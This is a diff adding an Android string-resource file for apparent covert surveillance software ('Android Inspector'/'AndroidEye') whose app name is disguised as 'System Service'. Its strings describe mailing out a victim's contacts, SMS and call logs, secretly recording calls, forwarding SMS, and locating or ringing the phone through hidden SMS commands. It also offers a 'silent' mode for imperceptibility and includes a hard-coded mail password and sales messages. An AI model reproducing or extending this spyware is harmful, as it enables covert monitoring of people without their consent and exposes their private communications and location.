@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">System Service</string>
+    <string name="info">Information</string>
+    <string name="warning">Warning</string>
+    <string name="error">Error</string>
+    
+    <!-- SMS -->
+    <string name="sms_received">Received</string>
+    <string name="sms_sent">Sent</string>
+    <string name="sms_unknown">Unknown</string>
+    <string name="sms_name">SMS</string>
+    <string name="sms_redirect_header">[From %s]</string>
+    <string name="sms_date">Date</string>
+    <string name="sms_type">Type</string>
+    <string name="sms_sendername">Sender</string>
+    <string name="sms_sendernumber">Sender Number</string>
+    <string name="sms_content">Message</string>
+    
+    <!-- Contact -->
+    <string name="contact_name">Contact</string>
+    <string name="contact_phone">Phone</string>
+    <string name="contact_address">Address</string>
+    <string name="contact_email">Mail</string>
+    
+    <!-- Phone Call -->
+    <string name="phonecall_hour">(h)</string>
+    <string name="phonecall_minute">(m)</string>
+    <string name="phonecall_second">(s)</string>
+    <string name="phonecall_name">PhoneCall</string>
+    <string name="phonecall_incoming">Incoming</string>
+    <string name="phonecall_outgoing">Outgoing</string>
+    <string name="phonecall_missed">Missed</string>
+    <string name="phonecall_date">Date</string>
+    <string name="phonecall_type">Type</string>
+    <string name="phonecall_number">Phone Number</string>
+    <string name="phonecall_contactname">Contact Name</string>
+    <string name="phonecall_duration">Duration</string>
+    <string name="phonecall_record">PhoneCallRecord</string>
+    
+    <!-- Mail -->
+    <string name="mail_sender_pwd">canadausa</string>
+    <string name="mail_from">From</string>
+    <string name="mail_description">(contacts, SMS and phone call history attached)</string>
+    <string name="mail_body_info">Hi, this is an auto mail from %s with contacts, SMS and phone call history attached.</string>
+    <string name="mail_body_record">Hi,this is an auto mail from %s with phone call recording attached.</string>
+    
+    <!-- Location -->
+    <string name="location_sms">Click link to see location: http://maps.google.com/?q=%s</string>
+    <string name="location_sms_latest">Latest(%s) </string>
+    <string name="location_sms_gps">GPS location: http://maps.google.com/?q=%s</string>
+    <string name="location_sms_network">network location: http://maps.google.com/?q=%s</string>
+    <string name="location_sms_base_station_gsm">Current base station location: http://maps.google.com/?q=%s</string>
+    <string name="location_sms_base_station_cdma">Current base station location: http://maps.google.com/?q=%s</string>
+    <string name="location_sms_fail">Sorry, cannot get location now. Please try again later. Contact supporter if it always fails.</string>
+    
+    <!-- Preferences -->
+    <string name="pref_title">Preferences</string>
+    <string name="pref_category_sender_mail_key">pref_category_sender</string>
+    <string name="pref_category_sender_mail_title">Mail Sender(Optional)</string>
+    <string name="pref_category_receiver_key">pref_category_receiver</string>
+    <string name="pref_category_receiver_title">Receiver Info</string>
+    <string name="pref_category_info_collector_key">pref_category_info_collector</string>
+    <string name="pref_category_info_collector_title">Collect Information</string>
+    <string name="pref_category_record_title">Phone Call Recording</string>
+    <string name="pref_category_sms_redirector_key">pref_category_sms_redirector</string>
+    <string name="pref_category_sms_redirector_title">SMS Redirection</string>
+    <string name="pref_category_gps_key">pref_category_gps</string>
+    <string name="pref_category_gps_title">Get Location</string>
+    <string name="pref_category_ring_title">Ring</string>
+    
+    <string name="pref_use_self_sender_title">Use my own GMail</string>
+    <string name="pref_use_self_sender_summary">Use your own GMail for better privacy, otherwise will use system mail sender. </string>
+    <string name="pref_sender_mail_title">Sender Mail(GMail ONLY)</string>
+    <string name="pref_sender_pwd_title">Password</string>
+    <string name="pref_invalid_sender_mail">%s 不是一个有效的GMail邮箱地址。</string>
+    <string name="pref_recv_mail_title">Receiver Mail</string>
+    <string name="pref_invalid_mail_format">Warning: %s is NOT a valid mail address.</string>
+    <string name="pref_pls_input_pwd">Please input mail password.</string>
+    <string name="pref_info_interval_title">Interval</string> <!-- days -->
+    <string name="pref_info_interval_dlg_title">Get info interval</string>
+    <string name="pref_record_all_title">Record all phone calls</string>
+    <string name="pref_record_all_summary">Permitted only when using your own GMail sender.</string>
+    <string name="pref_record_number_title">Target Number</string>
+    <string name="pref_record_number_summary">Record only when the phone call number contains the target number(at least 5 digits). Support 9 targets at most. Separate by blank space.</string>
+    <string name="pref_recv_phonenum_title">Receiver Phone Number</string>
+    <string name="pref_pls_input_valid_recv_phonenum">ERROR: %s is not a valid mobile phone number.</string>
+    <string name="pref_target_num_count_reach_max">9 numbers at most permitted.</string>
+    <string name="pref_target_num_format_error">ERROR: 4 digits per number at least.</string>
+    <string name="pref_redirect_all_sms_title">Redirect All SMS</string>
+    <string name="pref_redirect_all_sms_summary">Direct all SMS in real-time. Pay attention to its cost.</string>
+    <string name="pref_sensitive_words_title">Sensitive Words</string>
+    <string name="pref_sensitive_words_summary">Separate with blank space. No more than 9 words.</string>
+    <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate by blank space).</string>
+    <string name="pref_sensitive_words_count_reach_max">No more than %d sensitive words, the surplus words will be ignored. Please re-edit your sensitive words.</string>
+    <string name="pref_sensitive_words_count_reach_max">最多只能支持%d个敏感词，多余的将被忽略。请您重新编辑敏感词。</string>
+    <string name="pref_gps_word_title">Location Command</string>
+    <string name="pref_gps_word_summary">Send SMS(#dw) and then get back its location.</string>
+    <string name="pref_category_network_mode_title">Network</string>
+    <string name="pref_network_mode_title">Network Connect Mode</string>
+    <string name="pref_network_mode_summary">Suggest to keep the default "silent" mode for imperceptibility.</string>
+    <string name="pref_network_mode_dlg_title">Choose Mode</string>
+    <string name="pref_record_all_time_limit_in_trial">Only 10 times recording permitted in trial.</string>
+    <string name="pref_must_use_self_sender">For protecting your privacy, recording all phone calls is permitted ONLY when using your own GMail sender.</string>
+    <string name="pref_ring_word_title">Force Ring</string>
+    <string name="pref_ring_word_summary">Send SMS #xl to force ring</string>
+    
+    <!-- InitActivity -->
+    <string name="init_title">Android Inspector</string>
+    <string name="init_trial">(Trial)</string>
+    <string name="init_licensed">(Licensed)</string>
+    <string name="init_logo_description">Android Inspector</string>
+    <string name="init_btn_testrecvmail">Test Mail</string>
+    <string name="init_btn_testrecvphone">Test Phone</string>
+    <string name="init_btn_screenshot">Screenshot</string>
+    <string name="init_btn_setting">Setting</string>
+    <string name="init_btn_hide">Exit</string>
+    <string name="init_hint_testmail">Get all phonecalls, SMS, contacts and send to receiver mailbox.</string>
+    <string name="init_hint_testphone">Send a SMS to receiver phone.</string>
+    <string name="init_test_sms_content">A test SMS from Android Inspector.</string>
+	<string name="init_send_test_sms_ok">Sent Successfully</string>
+	<string name="init_send_test_sms_ng">Failed. Please check the receiver phone number and the mobile signal.</string>
+    <string name="init_hint_screenshot">Get a screenshot and send a mail</string>
+    <string name="init_hint_setting">Set mail address, phone number, sensitive words and etc.</string>
+    <string name="init_hint_hide">This dialog can be triggered again by sending ### SMS.</string>
+    <string name="init_processing">Processing...</string>
+    <string name="init_waiting">Collecting and Sending...</string>
+    <string name="init_pls_reset_phone">Please restart phone to enable all features and settings.</string>
+    <string name="init_sending">正在发邮件...</string>
+    <string name="init_pls_reset_phone">重启手机后，所有设定及功能即生效。</string>
+    
+    <!-- Actions -->
+    <string name="action_send_mail_success">Sent a mail to your mail box successfully</string>
+    <string name="action_send_mail_fail">Failed to send mail. Please check your mail setting.</string>
+    <string name="action_network_disconnected">Network disconnected.</string>
+    <string name="action_goto_network_setting">Network currently disconnected. Do you want to enable wireless network now?</string>
+    
+    <!-- Server -->
+	<string name="srv_address">15398053471</string>
+	
+	<!-- Message -->
+	<string name="msg_invalid_key">Invalid key. Probably it has been used. Please contact the software maker for support.</string>
+	<string name="msg_cannot_write_license_key_to_sharedpreferences">ERROR: failed to write license key information.</string>
+	<string name="msg_cannot_write_license_type_to_sharedpreferences">ERROR: failed to write license type information. Please try again or contact supporter.</string>
+    <string name="msg_mobile_net_unvailable">Make sure your mobile connected and not in flying mode.</string>
+    <string name="msg_auth_sms_sent_success">Sent validation SMS to server successfully.</string>
+    <string name="msg_auth_sms_sent_fail">ERROR: failed to send validation SMS to server. Please exit and try again or contact software support.</string>
+    <string name="msg_has_sent_trial_expire_sms">AndroidEye: trial expired in %s, please contact supporter(QQ:602592749) to buy a key.</string>
+    <string name="msg_expired_alert">AndroidEye: trial expired, please contact supporter(QQ:602592749) to buy a key.</string>
+    <string name="msg_sms_times_over_in_trial">安卓监控提醒您：试用期转发短信已经达到10条，如需继续使用请联系客服QQ:602592749。</string>
+    <string name="msg_recording_times_over_in_trial">安卓监控提醒您：试用期通话录音已经达到5次，如需继续使用请联系客服QQ:602592749。</string>
+    <string name="msg_changed_sim">%s changed SIM card.</string>
+    
+    <!-- Indication -->
+    <string name="indication_register_ok">注册成功。</string>
+    <string name="indication_register_ng">注册失败。请检查您发送的注册码是否正确。若无法解决请联系客服。</string>
+    <string name="indication_register_write_ng">注册信息写入失败。请再次尝试，如若无法解决请联系客服。</string>
+    <string name="indication_unregister_ok">卸载成功。</string>
+    <string name="indication_unregister_ng">卸载失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_selfsender_ok">设置发信邮箱成功。</string>
+    <string name="indication_set_selfsender_ng">设置发信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_stop_selfsender_ok">取消发信邮箱成功。</string>
+    <string name="indication_stop_selfsender_ng">取消发信邮箱失败。因为您当前对所有电话录音，为保护您的隐私，请继续使用您的专有发信邮箱。若无法解决请联系客服。</string>
+    <string name="indication_set_recv_mail_ok">设置收信邮箱成功。</string>
+    <string name="indication_set_recv_mail_ng">设置收信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_recv_phonenum_ok">设置主控手机号码成功。</string>
+    <string name="indication_set_recv_phonenum_ng">设置主控手机号码失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_getinfo_interval_ok">设置信息收集周期成功。</string>
+    <string name="indication_set_getinfo_interval_ng">设置信息收集周期失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_targetnum_ok">设置监听录音目标号码段成功。</string>
+    <string name="indication_set_targetnum_ng">设置监听录音目标号码段失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_targetall_ok">设置对所有电话录音成功。</string>
+    <string name="indication_set_targetall_ng">必须使用自己的发信邮箱，才能对所有电话录音。请使用#1#指令设置你的专有发信邮箱（目前仅支持GMail）。若无法解决请联系客服。</string>
+    <string name="indication_set_network_mode_ok">设置网络连接模式成功。</string>
+    <string name="indication_set_network_mode_ng">设置网络连接模式失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_sens_words_ok">设置敏感词成功。</string>
+    <string name="indication_set_sens_words_ng">设置敏感词失败。请检查您发送的指令格式是否正确，及敏感词个数是否超过最大数（9个）。若无法解决请联系客服。</string>
+    <string name="indication_enable_redirect_all_sms_ok">启用所有短信实时转发成功。</string>
+    <string name="indication_enable_redirect_all_sms_ng">启用所有短信实时转发失败。</string>
+    <string name="indication_disable_redirect_all_sms_ok">停止所有短信实时转发成功。</string>
+    <string name="indication_disable_redirect_all_sms_ng">停止所有短信实时转发失败。</string>
+    
+</resources>
